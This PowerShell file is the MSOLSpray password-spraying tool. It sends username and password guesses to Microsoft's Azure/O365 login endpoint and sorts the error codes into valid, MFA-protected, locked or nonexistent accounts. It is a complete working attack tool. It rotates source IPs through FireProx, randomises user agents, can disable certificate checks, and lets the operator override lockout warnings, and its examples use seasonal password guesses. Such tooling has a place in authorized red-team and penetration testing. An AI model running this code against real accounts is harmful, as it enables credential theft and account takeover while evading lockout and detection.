#Requires -Version 5.1
#region Invoke-MSOLSpray
function Invoke-MSOLSpray {
    <#
    .SYNOPSIS
        This function will perform password spraying against Microsoft Online accounts (Azure/O365). 
    
    .DESCRIPTION
        This function will perform password spraying against Microsoft Online accounts (Azure/O365). 
        The function logs the response of https://login.microsoft.com. This is used for example to indicating if a user cred is valid, if MFA is enabled on the account, if a tenant doesn't exist, if a user doesn't exist, if the account is locked, or if the account is disabled.
    
    .NOTES
        MSOLSpray Function: Invoke-MSOLSpray
        Authors: Beau Bullock (@dafthack), Justin Perdok (@JustinPerdok)
        License: BSD 3-Clause
        Required Dependencies: None
        Optional Dependencies: None
    
    .INPUTS
        New-Object PSObject -Property @{Usernames = "Steve@domain.com","John@domain.com";Passwords="Summer2020",'Winter2020','Fall2020'} | Format-Table

        Usernames                           Passwords
        ---------                           ---------
        {Steve@domain.com, John@domain.com} {Summer2020, Winter2020, Fall20    
    
    .OUTPUTS
        Time                Username         Password   IsValid ResponseError
        ----                --------         --------   ------- -------------
        2020-08-15T18:20:50.1611349+02:00 Steve@domain.com Winter2020   True  None.
    
    .PARAMETER Usernames
        Takes in a single or multiple usernames in the following format "user@domain.com". 
        Can be combined with UsernameList.
    
     .PARAMETER UsernameList
        Takes in a single or multiple UsernameList files filled with usernames. Usernames should be entered one-per-line in the following format "user@domain.com". 
        Can be combined with Usernames.
    
    .PARAMETER Passwords
        Takes in a single or multiple passwords. Can be combined with PasswordList.
    
    .PARAMETER PasswordList
        Takes in a single or multiple PasswordList files with passwords. Entered one-per-line. Can be combined with Passwords.
    
    .PARAMETER URL
        The URL to spray against. Potentially useful if pointing at an API Gateway URL generated with something like FireProx to randomize the IP address you are authenticating from.        
    
    .PARAMETER Delay
        The delay used to wait between authentication attempts.

    .PARAMETER UserAgent
        The UserAgent PowerShell will use during the logon the password spray.
    
    .PARAMETER IgnoreSSL
        This will disable any SSL/TLS checks preformed by Invoke-WebRequest during the password spray.
    
    .PARAMETER OutFile
        A file to output valid results to.

    .PARAMETER lockout_threshold
        The threshold used to stop the spray when this many locked accounts are detected.

    .PARAMETER ValidPasswordCodes
        The ErrorCodes that indicate a password was valid but can not be used for reason X.
        
        Here is a referense list of all the Azure AD Authentication an Authorization Error Codes:
        https://docs.microsoft.com/en-us/azure/active-directory/develop/reference-aadsts-error-codes
        
        Here is a online check that takes the error codes and returns what it means:
        https://login.microsoftonline.com/error

    .PARAMETER LockoutCodes
        The ErrorCodes that indicates if a account is locked.
        
        Here is a referense list of all the Azure AD Authentication an Authorization Error Codes:
        https://docs.microsoft.com/en-us/azure/active-directory/develop/reference-aadsts-error-codes
        
        Here is a online check that takes the error codes and returns what it means:
        https://login.microsoftonline.com/error

    .PARAMETER DisableUniqueValues
        By default the usernames and passwords are checked for duplicates. Use this switch to disable this check.

    .PARAMETER Force
        Forces the spray to continue and not stop when multiple account lockouts are detected.

    .EXAMPLE
        # The following command will use the provided username and password to authenticte.
        
        PS C:\> Invoke-MSOLSpray -Usernames Steve@domain.com -Passwords Winter2020

        Time          : 2020-08-15T18:20:50.1611349+02:00
        Username      : Steve@domain.com
        Password      : Winter2020
        IsValid       : True
        ResponseError : None.
    .EXAMPLE
        # The following command uses the specified FireProx URL to spray from randomized IP addresses. See this for FireProx setup: https://github.com/ustayready/fireprox.

        PS C:\> Invoke-MSOLSpray -Usernames Steve@domain.com -Passwords Winter2020 -URL https://api-gateway-endpoint-id.execute-api.us-east-1.amazonaws.com/fireprox
        
        Time          : 2020-08-15T18:20:50.1611349+02:00
        Username      : Steve@domain.com
        Password      : Winter2020
        IsValid       : True
        ResponseError : None.
    .EXAMPLE
    
        PS C:\> Invoke-MSOLSpray -Usernames Steve@domain.com -Passwords Winter2020,Summer2020 -OutFile C:\outfile.txt
        Valid results have been written to C:\outfile.txt

        PS C:\> gc C:\outfile.txt
        2020-08-15T18:20:50.1611349+02:00 : Steve@domain.com : Winter2020 : None.

    .EXAMPLE
        # The following command will use the provided UsernameList and attempt to authenticate to each account with a password of Winter2020.
        
        PS C:\> Invoke-MSOLSpray -UsernameList C:\UsernameList.txt -Password Winter2020 | Format-Table

        Time                               Username         Password   IsValid ResponseError
        ----                               --------         --------   ------- -------------
        2020-08-15T18:20:50.1611349+02:00  Steve@domain.com Winter2020   True  None.
        2020-08-15T18:20:50.1611349+02:00  John@domain.com  Winter2020   False AADSTS50126: Error validating credentials due to invalid username or password.
        2020-08-15T18:20:50.1611349+02:00  Dave@domain.com  Winter2020   False AADSTS50126: Error validating credentials due to invalid username or password.
    .EXAMPLE
        # The following command will use the provided usernames and both UsernameList and attempt to authenticate to each account with the passwords Summer2020 and Zomer2020.
        
        PS C:\> Invoke-MSOLSpray -Usernames Steve@domain.com,Klaas@domain.nl -UsernameList C:\domain_com_UsernameList.txt,C:\domein_nl_UsernameList.txt -Password Summer2020,Zomer2020 | Format-Table

        Time                               Username         Password    IsValid  ResponseError
        ----                               --------         --------    -------  -------------
        2020-08-15T18:20:50.1611349+02:00  Steve@domain.com Summer2020  False    AADSTS50126: Error validating credentials due to invalid username or password.
        2020-08-15T18:20:50.1611349+02:00  John@domain.com  Summer2020  True     None.
        2020-08-15T18:20:50.1611349+02:00  Dave@domain.com  Summer2020  True     AADSTS50079: Due to a configuration change made by your administrator, or because you moved to a new location, you must enroll in multi-factor authentication to access '{identifier}'.
        2020-08-15T18:20:50.1611349+02:00  klaas@domain.nl  Summer2020  False    AADSTS50126: Error validating credentials due to invalid username or password.
        2020-08-15T18:20:50.1611349+02:00  jan@domain.nl    Summer2020  False    AADSTS50126: Error validating credentials due to invalid username or password.
        2020-08-15T18:20:50.1611349+02:00  Steve@domain.com Zomer2020   False    AADSTS50126: Error validating credentials due to invalid username or password.
        2020-08-15T18:20:50.1611349+02:00  John@domain.com  Zomer2020   False    AADSTS50126: Error validating credentials due to invalid username or password.
        2020-08-15T18:20:50.1611349+02:00  Dave@domain.com  Zomer2020   False    AADSTS50126: Error validating credentials due to invalid username or password.
        2020-08-15T18:20:50.1611349+02:00  klaas@domain.nl  Zomer2020   True     None.
        2020-08-15T18:20:50.1611349+02:00  jan@domain.nl    Zomer2020   True     AADSTS53000: Device is not in required device state: compliant. Conditional Access policy requires a compliant device, and the device is not compliant. The user must enroll their device with an approved MDM provider like Intune.

    .EXAMPLE
        # The following command will use the provided usernames and attempt to authenticate to each account with the passwords from both PasswordLists
        
        PS C:\> Invoke-MSOLSpray -Usernames Steve@domain.com,John@domain.com -PasswordList C:\seasons_year.txt,C:\company_name_special_characters.txt
        
        Time                               Username         Password    IsValid ResponseError
        ----                               --------         --------    ------- -------------
        2020-08-15T18:20:50.1611349+02:00  Steve@domain.com Spring2020  False   AADSTS50126: Error validating credentials due to invalid username or password.
        2020-08-15T18:20:50.1611349+02:00  John@domain.com  Spring020   False   AADSTS50126: Error validating credentials due to invalid username or password.        
        2020-08-15T18:20:50.1611349+02:00  Steve@domain.com Summer2020  False   AADSTS50126: Error validating credentials due to invalid username or password.
        2020-08-15T18:20:50.1611349+02:00  John@domain.com  Summer2020  True    None.
        2020-08-15T18:20:50.1611349+02:00  Steve@domain.com Fall2020    False   AADSTS50126: Error validating credentials due to invalid username or password.
        2020-08-15T18:20:50.1611349+02:00  John@domain.com  Fall2020    False   AADSTS50126: Error validating credentials due to invalid username or password.
        2020-08-15T18:20:50.1611349+02:00  Steve@domain.com Winter2020  True    None.
        2020-08-15T18:20:50.1611349+02:00  John@domain.com  Winter2020  False   AADSTS50126: Error validating credentials due to invalid username or password.
        2020-08-15T18:20:50.1611349+02:00  Steve@domain.com Spring2019  False   AADSTS50126: Error validating credentials due to invalid username or password.
        2020-08-15T18:20:50.1611349+02:00  John@domain.com  Spring2019  False   AADSTS50126: Error validating credentials due to invalid username or password.        
        2020-08-15T18:20:50.1611349+02:00  Steve@domain.com Summer2019  False   AADSTS50126: Error validating credentials due to invalid username or password.
        2020-08-15T18:20:50.1611349+02:00  John@domain.com  Summer2019  False   AADSTS50126: Error validating credentials due to invalid username or password.
        2020-08-15T18:20:50.1611349+02:00  Steve@domain.com Fall2019    False   AADSTS50126: Error validating credentials due to invalid username or password.
        2020-08-15T18:20:50.1611349+02:00  John@domain.com  Fall2019    False   AADSTS50126: Error validating credentials due to invalid username or password.
        2020-08-15T18:20:50.1611349+02:00  Steve@domain.com Winter2019  False   AADSTS50126: Error validating credentials due to invalid username or password.
        2020-08-15T18:20:50.1611349+02:00  John@domain.com  Winter2019  False   AADSTS50126: Error validating credentials due to invalid username or password.
        2020-08-15T18:20:50.1611349+02:00  Steve@domain.com Domain!     False   AADSTS50126: Error validating credentials due to invalid username or password.
        2020-08-15T18:20:50.1611349+02:00  John@domain.com  Domain!     False   AADSTS50126: Error validating credentials due to invalid username or password.
        2020-08-15T18:20:50.1611349+02:00  Steve@domain.com Domain@     False   AADSTS50126: Error validating credentials due to invalid username or password.
        2020-08-15T18:20:50.1611349+02:00  John@domain.com  Domain@     False   AADSTS50126: Error validating credentials due to invalid username or password.

    .EXAMPLE
        # The following command will use input provided from the pipeline to authenticte.
        
        PS C:\> $Object = New-Object PSObject -Property @{Usernames = "Steve@domain.com","John@domain.com";Passwords="Summer2020",'Winter2020','Fall2020'}
        PS C:\> $Object

        Usernames                           Passwords
        ---------                           ---------
        {Steve@domain.com, John@domain.com} {Summer2020, Winter2020, Fall2020}

        PS C:\> $Object | Invoke-MSOLSpray | Format-Table -AutoSize

        Time                               Username         Password   IsValid ResponseError
        ----                               --------         --------   ------- -------------
        2020-08-15T18:20:50.1611349+02:00  Steve@domain.com Summer2020   False AADSTS50126: Error validating credentials due to invalid username or password.
        2020-08-15T18:20:50.1611349+02:00  Steve@domain.com Winter2020   True  None.
        2020-08-15T18:20:50.1611349+02:00  Steve@domain.com Fall2020     False AADSTS50126: Error validating credentials due to invalid username or password.
        2020-08-15T18:20:50.1611349+02:00  John@domain.com  Summer2020   True  None.
        2020-08-15T18:20:50.1611349+02:00  John@domain.com  Winter2020   False AADSTS50126: Error validating credentials due to invalid username or password.
        2020-08-15T18:20:50.1611349+02:00  John@domain.com  Fall2020     False AADSTS50126: Error validating credentials due to invalid username or password.           
    #> 
    [cmdletbinding()]       
    Param(
        [Parameter(ValueFromPipelineByPropertyName)]
        [Array]$Usernames,
        [Array]$UsernameList,
        [Parameter(ValueFromPipelineByPropertyName)]
        [Array]$Passwords,
        [Array]$PasswordList,        
        [Parameter()]
        [Uri]$URL = "https://login.microsoft.com",
        [Parameter()]
        [Int]$Delay = 0,
        [Parameter()]
        [String]$UserAgent = $(Get-InvokeMSOLUserAgent),
        [Parameter()]
        [Switch]$IgnoreSSL,
        [Parameter()]
        [String]$OutFile,
        [Parameter()]        
        [Int]$lockout_threshold = 10,
        [Parameter()]
        [Array]$ValidPasswordCodes = @("50126", "50079", "50158", "53000"),
        [Parameter()]
        [Array]$LockoutCodes = @("50053"),
        [Parameter()]        
        [Switch]$DisableUniqueValues = $false,
        [Parameter()]
        [Switch]$Force
    )
    Begin {
        Try {
            $OutputObject = @()
            $lockout_count = 0
            If ($IgnoreSSL) {
                Write-Verbose "Disabling certificate valiation"
                [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
            }
            $AuthURL = "$URL/common/oauth2/token"
            If ($([System.Uri]$AuthURL).Scheme -NotMatch 'http|https') {
                Write-Error "$AuthURL is not a valid url. Please use the following format `'http://host/`' or `'https://host/`'" -ErrorAction Stop
            }
        }
        Catch {
            $PSCmdlet.ThrowTerminatingError($PSItem)
        }
    }
    Process {
        $ProgressBarStartTime = Get-Date; $ProgressBar = 0
        ForEach ($List in $UsernameList) {
            If (Test-Path $List) {
                $Content = Get-Content $List
                $ProgressBar = Write-MyProgressBar -StartTime $ProgressBarStartTime -ObjectToCalculate $UsernameList -Count $ProgressBar -Activity "Setting up" -NestedDepth 1 -TaskPrefixText "Userslists" -Task "Adding $($content.count) entries from $list to the list of $($usernames.count) usernames." -AddPauses
                $Usernames += $Content
            }
            Else {
                Write-Error "Unable to open UsernameList at path: $($List)" -ErrorAction Continue
            }
        }
        $ProgressBarStartTime = Get-Date; $ProgressBar = 0
        ForEach ($List in $PasswordList) {
            If (Test-Path $List) {
                $Content = Get-Content $List
                $ProgressBar = Write-MyProgressBar -StartTime $ProgressBarStartTime -ObjectToCalculate $PasswordList -Count $ProgressBar -Activity "Setting up" -NestedDepth 1 -TaskPrefixText "Passwordlists" -Task "Adding $($content.count) entries from $list to the list of $($Passwords.count) passwords." -AddPauses
                $Passwords += $Content
            } 
            Else {
                Write-Error "Unable to open Passlist at path: $($List)" -ErrorAction Continue
            }
        }
        If ($false -eq $DisableUniqueValues) {
            Write-Verbose "Ensure only unique vales are used."
            $Usernames = $Usernames | Sort-Object -Unique
            $Passwords = $Passwords | Sort-Object -Unique
        }
        $UserProgressBarStartTime = Get-Date; $UserProgressBar = 0
        :Userloop ForEach ($Username in $Usernames) {
            $UserProgressBar = Write-MyProgressBar -StartTime $UserProgressBarStartTime -ObjectToCalculate $Usernames -Count $UserProgressBar -Activity "Testing users" -NestedDepth 1 -TaskPrefixText "User" -Task "Spraying password against user $($username)" -AddPauses
            $PasswordProgressBarStartTime = Get-Date; $PasswordProgressBar = 0
            ForEach ($Password in $Passwords) {
                $PasswordProgressBar = Write-MyProgressBar -StartTime $PasswordProgressBarStartTime -ObjectToCalculate $Passwords -Count $PasswordProgressBar -Activity "Testing Passwords" -NestedDepth 2 -id 2 -parentid 1 -TaskPrefixText "Password" -Task "Spraying password $($Password)" -AddPauses
                If ($Delay -gt 0) {
                    Start-Sleep -Seconds $Delay
                }
                $LogonRequest = $null     
                $ErrorObject = $null
                $BodyParams = @{'resource' = 'https://graph.windows.net'; 
                    'client_id'            = '1b730954-1685-4b74-9bfd-dac224a7b894';
                    'client_info'          = '1';
                    'grant_type'           = 'password';
                    'username'             = $Username;
                    'password'             = $Password;
                    'scope'                = 'openid' 
                }
                $PostHeaders = @{'Accept' = 'application/json';
                    'Content-Type'        = 'application/x-www-form-urlencoded'
                }
                Try {
                    $TimeOfRequest = Get-Date -Format o
                    $LogonRequest = Invoke-WebRequest -Uri $AuthURL -Method Post -Headers $PostHeaders -Body $BodyParams -UserAgent $UserAgent -ErrorVariable ResponseError
                    If ($LogonRequest.StatusCode -eq "200") {
                        Write-Verbose "Found valid user credential. $($TimeOfRequest):$($Username):$($Password)"
                        $OutputObject += Add-InvokeMSOLOutputToObject -Time $TimeOfRequest -Username $Username -Password $Password -IsValid $true -ResponseError "None."
                    }
                    Else {
                        $OutputObject += Add-InvokeMSOLOutputToObject -Time $TimeOfRequest -Username $Username -Password $Password -IsValid $false -ResponseError "Unexpected StatusCode: $($LogonRequest.StatusCode)"
                    }
                }
                Catch {
                    if ($null -ne $ResponseError.Message) {
                        $ErrorObject = $ResponseError.Message | ConvertFrom-Json
                        $ErrorMessage = $($($ErrorObject.error_description).Split([Environment]::NewLine)[0])
                        $IsPasswordValid = $False
                        if ($ValidPasswordCodes.Contains($ErrorObject.error_codes)) {
                            Write-Verbose "Found valid user credential. $($Username):$($Password) but $ErrorMessage"
                            $IsPasswordValid = $true
                        }
                        ElseIf ($LockoutCodes.Contains($ErrorObject.error_codes)) {
                            $lockout_count++
                        }
                        $OutputObject += Add-InvokeMSOLOutputToObject -Time $TimeOfRequest -Username $Username -Password $Password -IsValid $IsPasswordValid -ResponseError $ErrorMessage                        
                    }
                }
                If (!$Force -and $lockout_count -eq $lockout_threshold) {
                    Write-Verbose "If the force flag isn't set and lockout count is 10 we'll ask if the user is sure they want to keep spraying"
                    If ($(Get-InvokeMSOLYesOrNo -Title "WARNING! Multiple Account Lockouts Detected!" -Question "10 of the accounts you sprayed appear to be locked out. If you are seeing multiple 'account is locked' messages after your first 10 attempts or so this may indicate Azure AD Smart Lockout is enabled. Do you want to continue this spray?")) {
                        Break :Userloop
                    }
                }
            }
            Write-MyProgressBar -Activity "Password Spraying" -ID 2 -NestedDepth 2 -ParentID 1 -Completed
        }
        Write-MyProgressBar -Activity "Password Spraying" -NestedDepth 1 -Completed
    }
    End {
        If ($OutFile) {
            If ($OutputObject) {
                $OutputObject | Where-Object { $_.IsValid -eq $true } | ForEach-Object {
                    Write-Output "$($_.Time) : $($_.Username) : $($_.Password) : $($_.ResponseError)" | Add-Content -Encoding Ascii -Path $OutFile
                }
                Write-Output "Valid results have been written to $OutFile."
            }
        }
        Else {
            Return $OutputObject
        }
    }
}
#endregion
#region helperfunctions
Function Add-InvokeMSOLOutputToObject {
    Param (
        $Time,
        $Username,
        $Password,
        $IsValid,
        $ResponseError
    )
    Return $(New-Object PSCustomObject -Property @{ 
            Time          = $Time;
            Username      = $Username;
            Password      = $Password;
            IsValid       = $IsValid;
            ResponseError = $ResponseError;
        } | Select-Object Time, Username, Password, IsValid, ResponseError
    )
}
Function Get-InvokeMSOLYesOrNo {
    <#
        .LINK
        https://github.com/justin-p/PowerShell/blob/master/Get-YesOrNo.ps1
    #>    
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory)]
        [ValidateNotNullOrEmpty()]
        [string]$Title,
        [Parameter(Mandatory)]
        [ValidateNotNullOrEmpty()]
        [string]$Question
    )
    Return $(Switch ($host.ui.PromptForChoice($Title, $Question, $('&yes', '&no'), 0)) {
            0 { $true }
            1 { $false }
        })
}
Function Get-InvokeMSOLUserAgent {
    <#
        .LINK
        https://github.com/justin-p/PowerShell/blob/master/Get-UserAgent.ps1
    #>
    Param (
        [ValidateSet('Firefox', 'Chrome', 'InternetExplorer', 'Opera', 'Safari')]
        [string]$BrowserType
    )
    if (!$BrowserType) {
        $BrowserType = Get-Random -InputObject @('Firefox', 'Chrome', 'InternetExplorer', 'Opera', 'Safari')
    }
    Return [string]$([Microsoft.PowerShell.Commands.PSUserAgent]::$BrowserType)
}
function Write-MyProgressBar {
    <#  
    .SYNOPSIS  
        Wrapper around Write-Progress.

    .DESCRIPTION
        Wrapper around Write-Progress. Makes your code look a lot cleaner when using Write-Progress.
      
    .NOTES  
        Author: Justin Perdok, https://justin-p.me.
        Based of: https://github.com/thomas-illiet/Write-MyProgress, Thomas ILLIET, https://thomas-illiet.fr
        License: MIT
        
    .LINK 
        https://github.com/justin-p/PowerShell/blob/master/Write-MyProgressBar.ps1

    .PARAMETER ObjectToCalculate
        PowerShell Object used in the progress bar to calculate from.

    .PARAMETER Activity
        Specifies the first line of text in the heading above the status bar. This text describes the activity whose progress is being reported.

    .PARAMETER Task
        The name of the task that is running.

    .PARAMETER TaskPrefixText
        Any prefix text that should be added to the task.

    .PARAMETER StartTime
        The time used to calculate time elapsed and remaning. This should be set once outside of a ForEach.

    .PARAMETER Count
        Counter used to indicate the current entry from the ObjectToCalculate.

    .PARAMETER ManualTotalSteps
        Value that will be used to calculate against the $count for
        
    .PARAMETER id
        Specifies an ID that distinguishes each progress bar from the others. 
        Use this parameter when you are creating more than one progress bar in a single command. 
        If the progress bars do not have different IDs, they are superimposed instead of being displayed in a series.
      
    .PARAMETER ParentId
        Specifies the parent activity of the current activity. Use the value -1 if the current activity has no parent activity
      
    .PARAMETER NoTimeRemaining
        Can be used to skip the calculation of SecondsElapsed and SecondsRemaining

    .PARAMETER StepPercentage 
        Can be used to enable the Percentage based on the steps shown in the progress bar

    .PARAMETER NoPercentage
        Can be used to disable percentage based of the ObjectToCalculate

    .PARAMETER Completed
        Indicates whether the progress bar is visible. If this parameter is omitted, Write-MyProgressBar displays progress information.

    .PARAMETER NestedDepth
        Can be used to nest progress bars.  

    .PARAMETER AddPauses
        Adds pauses after writing the progress bar

    .PARAMETER ProgressBarWaitInMiliseconds
        How long a pause should take after writing a progress bar

    .PARAMETER NoCountIncrease
        Can be used to disable the count of the function. The functions updates the $Count param by one and returns it once its done.
        This simplyfies the the usage of the counter.
    
    .EXAMPLE  
        $GetProcess = Get-Process
        $Count = 0
        $StartTime = Get-Date
        ForEach($Process in $GetProcess) {
            $Count = Write-MyProgressBar -StartTime $StartTime -ObjectToCalculate $GetProcess -Count $Count -Activity "Showing info about Processess" -NestedDepth 1 -TaskPrefixText "Process" -Task "Process Path $($Process.path)" -AddPauses
        }
        Write-MyProgressBar -Activity "Showing info about Processess"  -NestedDepth 1 -Completed
    .EXAMPLE  
        $GetProcess = $(Get-Process)[0..4]
        $ProcessCount = 0
        $StartTime = Get-Date
        ForEach($Process in $GetProcess) {
            $ProcessCount = Write-MyProgressBar -StartTime $StartTime -ObjectToCalculate $GetProcess -Count $ProcessCount -Activity "Showing info about Processess" -TaskPrefixText "Process" -Task "Process Path $($Process.path)" -AddPauses -NoTimeRemaining -NoPercentage
            $ProcModuleCount = 0
            $SubStartTime = Get-Date
            ForEach ($ProcModule in $($process.modules)) {
                $ProcModuleCount = Write-MyProgressBar -StartTime $SubStartTime -ObjectToCalculate $($process.modules) -Count $ProcModuleCount -ID 2 -NestedDepth 1 -ParentID 1 -Activity "Showing info about Process modules" -TaskPrefixText "Module" -Task "Process module name $($ProcModule.ModuleName)" -AddPauses -NoPercentage
            }
            Write-MyProgressBar -Activity "Showing info about Processess modules" -ID 2 -NestedDepth 1 -ParentID 1 -Completed
            $ProcThreadCount = 0
            $SubStartTime = Get-Date
            ForEach ($ProcThread in $($process.threads)) {
                $ProcThreadCount = Write-MyProgressBar -StartTime $SubStartTime -ObjectToCalculate $($process.threads) -Count $ProcThreadCount -ID 2 -NestedDepth 1 -ParentID 1 -Activity "Showing info about Process threads" -TaskPrefixText "Thread" -Task "Process thread id $($ProcThread.id)" -AddPauses -ProgressBarWaitInMiliseconds 1000 -NoPercentage
            }
            Write-MyProgressBar -Activity "Showing info about Processess threads" -ID 2 -NestedDepth 1 -ParentID 1 -Completed
        }
        Write-MyProgressBar -Activity "Showing info about Processess" -NestedDepth 1 -Completed
    .EXAMPLE
        Function Get-Stuff {
            [cmdletbinding()]
            Param (
                [switch]$HardwareStuff,
                [switch]$MailStuff,
                [switch]$PowerShellStuff,
                [switch]$PythonStuff,
                [switch]$NetworkStuff
            )
            Begin {
                $StepCounter = 1
                $TotalSteps = 5
            } 
            Process {
                If ($HardwareStuff -eq $true) {
                    $StepCounter = Write-MyProgressBar -Activity "Getting information" -Task "Getting Hardware Info" -Count $StepCounter -NestedDepth 1 -ManualTotalSteps $TotalSteps -StepPercentage -AddPauses -ProgressBarWaitInMiliseconds 100 -NoTimeRemaining
                    $SomeFunction = "output"; start-sleep -s 1
                }
                If ($MailStuff -eq $true) {
                    $StepCounter = Write-MyProgressBar -Activity "Getting information" -Task "Getting Mail Info" -Count $StepCounter -NestedDepth 1 -ManualTotalSteps $TotalSteps -StepPercentage -AddPauses -ProgressBarWaitInMiliseconds 100 -NoTimeRemaining
                    $SomeFunction = "output"; start-sleep -s 1
                }
                If ($PowerShellStuff -eq $true) {
                    $StepCounter = Write-MyProgressBar -Activity "Getting information" -Task "Getting PowerShell Info" -Count $StepCounter -NestedDepth 1 -ManualTotalSteps $TotalSteps -StepPercentage -AddPauses -ProgressBarWaitInMiliseconds 100 -NoTimeRemaining
                    $SomeFunction = "output"; start-sleep -s 1
                }
                If ($PythonStuff -eq $true) {
                    $StepCounter = Write-MyProgressBar -Activity "Getting information" -Task "Getting Python Info" -Count $StepCounter -NestedDepth 1 -ManualTotalSteps $TotalSteps -StepPercentage -AddPauses -ProgressBarWaitInMiliseconds 100 -NoTimeRemaining
                    $SomeFunction = "output"; start-sleep -s 1
                }
                If ($NetworkStuff -eq $true) {
                    $StepCounter = Write-MyProgressBar -Activity "Getting information" -Task "Getting Network Info" -Count $StepCounter -NestedDepth 1 -ManualTotalSteps $TotalSteps -StepPercentage -AddPauses -ProgressBarWaitInMiliseconds 100 -NoTimeRemaining
                    $SomeFunction = "output"; start-sleep -s 1
                }                                      
            }
            End {
                Write-MyProgressBar -Activity "Getting information" -NestedDepth 1 -Completed -NoTimeRemaining
            }
        }
        Get-Stuff -HardwareStuff -MailStuff -PowerShellStuff -PythonStuff -NetworkStuff 
    #>
    Param(
        [parameter(Mandatory = $False)]
        [Array]$ObjectToCalculate,
        [parameter(Mandatory = $false)]
        [String]$Activity,
        [parameter(Mandatory = $false)]
        [String]$Task,
        [parameter(Mandatory = $false)]
        [String]$TaskPrefixText = 'Step',
        [parameter(Mandatory = $false)]
        [DateTime]$StartTime,
        [parameter(Mandatory = $false)]
        [Int]$Count,
        [parameter(Mandatory = $false)]
        [Int]$ManualTotalSteps,
        [parameter(Mandatory = $false)]
        [Int]$Id = 1,
        [parameter(Mandatory = $false)]
        [Int]$ParentId = -1,
        [parameter(Mandatory = $false)]
        [Switch]$NoTimeRemaining,
        [parameter(Mandatory = $false)]
        [switch]$StepPercentage,
        [parameter(Mandatory = $false)]
        [Switch]$NoPercentage,
        [parameter(Mandatory = $false)]
        [Switch]$Completed = $false,
        [parameter(Mandatory = $false)]
        [Int]$NestedDepth = 0,
        [parameter(Mandatory = $false)]
        [Switch]$AddPauses,
        [parameter(Mandatory = $false)]
        [Int]$ProgressBarWaitInMiliseconds = 25,
        [parameter(Mandatory = $false)]
        [Switch]$NoCountIncrease
    )
    Begin {
        $Argument = @{}
        If ($null -ne $NestedDepth) {
            $Argument += @{ 
                ID       = ($NestedDepth)
                ParentId = ($NestedDepth - 1)
            } 
        }
        ElseIf (0 -eq $NestedDepth) {
            $Argument += @{ Id = $Id } 
        }
        Else {
            If ($null -ne $id) { 
                $Argument += @{ Id = $Id } 
            }
            If ($null -ne $ParentId) {
                $Argument += @{ ParentId = $ParentId } 
            }        
        }
        If ($null -eq $startTime -or $null -eq $ObjectToCalculate) {
            If ($StepPercentage -ne $true) {
                $NoTimeRemaining = $true
                $NoPercentage = $true
            }
            ElseIf ($StepPercentage -eq $true) {
                $NoTimeRemaining = $true            
            }
            If ([String]::IsNullOrEmpty(($Activity))) { 
                $Argument += @{
                    Activity = "Processing Record $Count"
                } 
            }
        }
        ElseIf ($null -ne $ObjectToCalculate) {
            If ([String]::IsNullOrEmpty(($Activity))) { 
                $Argument += @{
                    Activity = "Processing Record $Count of $($ObjectToCalculate.Count)"
                }
            }          
        }
        Elseif ($null -eq $Activity) {
            $Argument += @{
                Activity = "Processing Record $Count"
            }             
        }
        If ($null -eq $Activity) {
            $Argument += @{
                Activity = "Processing Record $Count"
            }
        }
        ElseIf ($null -eq $Argument.Activity) {
            $Argument += @{
                Activity = $Activity
            }      
        }
        If ($NoPercentage -ne $True) {
            If ($StepPercentage -eq $true) {
                $Argument += @{
                    PercentComplete  = (($Count / $($ManualTotalSteps)) * 100)
                    CurrentOperation = "$("{0:N2}" -f ((($Count/$($ManualTotalSteps)) * 100),2))% Complete"
                }
            }
            Else {      
                $Argument += @{
                    PercentComplete  = (($Count / $($ObjectToCalculate.Count)) * 100)
                    CurrentOperation = "$("{0:N2}" -f ((($Count/$($ObjectToCalculate.Count)) * 100),2))% Complete"
                }   
            }      
        }
        If ($NoTimeRemaining -ne $true) {
            $SecondsElapsed = ((Get-Date) - $StartTime).TotalSeconds
            Try {
                [int]$SecondsRemaining = ($SecondsElapsed / ($Count / $ObjectToCalculate.Count)) - $SecondsElapsed
            }
            Catch {
                [int]$SecondsRemaining = 999
            }
            $Argument += @{ SecondsRemaining = $SecondsRemaining }
        }
        If ($Task) {
            If ($StepPercentage -eq $true) {
                $Argument += @{ status = $("$TaskPrefixText $Count out of $ManualTotalSteps | $Task") }
            }
            Else {
                $Argument += @{ status = $("$TaskPrefixText $Count out of $($ObjectToCalculate.Count) | $Task") }
            }
        }
        If ($Completed) {
            $Argument += @{ Completed = $Completed }        
        }
    }
    Process {    
        ForEach ($Arg in $Argument.Keys) {
            Write-Debug $("Write-MyProgressBar - $Arg : $($Argument[$Arg])")
        }
    } 
    End {
        Write-Progress -ErrorAction SilentlyContinue @Argument
        If ($AddPauses) {
            Start-Sleep -Milliseconds $ProgressBarWaitInMiliseconds     
        }
        If ($Completed -eq $true) {
            Return
        }        
        If ($NoCountIncrease -ne $true) {
            Return $Count + 1
        }
    }
}
#endregion
